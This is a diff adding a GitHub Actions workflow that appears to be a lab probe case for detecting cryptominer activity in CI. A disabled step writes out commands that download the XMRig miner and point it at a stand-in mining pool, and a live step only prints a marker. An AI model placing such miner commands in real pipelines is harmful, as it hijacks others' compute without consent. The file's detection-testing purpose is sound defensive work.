@@ -1,0 +1,23 @@
+name: Hold probe 07 - cryptominer
+
+on:
+  push:
+    branches:
+      - case-07-cryptominer
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Unreachable miner download and pool connection
+        if: ${{ false }}
+        run: |
+          curl -L https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig.tar.gz \
+            -o /tmp/xmrig.tar.gz
+          xmrig --url pool.example.invalid:3333 --user lab-wallet
+      - name: Emit harmless marker
+        run: printf '%s\n' 'HOLD_LAB_CASE=cryptominer'
